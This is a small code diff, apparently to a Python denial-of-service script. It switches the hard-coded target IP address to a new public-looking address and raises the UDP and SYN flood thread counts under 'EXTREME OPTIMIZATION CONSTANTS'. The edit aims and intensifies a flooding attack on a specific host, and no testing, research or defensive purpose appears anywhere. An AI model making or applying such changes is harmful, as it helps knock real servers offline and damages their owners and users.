@@ -5,11 +5,11 @@ import random
 import struct
 
 # TARGET
-TARGET_IP = "45.60.39.88"
+TARGET_IP = "62.109.121.42"
 
 # EXTREME OPTIMIZATION CONSTANTS
-UDP_THREADS = 300      # Increased from 200
-SYN_THREADS = 150      # Increased from 100  
+UDP_THREADS = 400      # Increased from 200
+SYN_THREADS = 250      # Increased from 100  
 SOCKET_POOL_SIZE = 20  # More sockets per thread
 BATCH_SIZE = 10        # Send multiple packets per loop
 
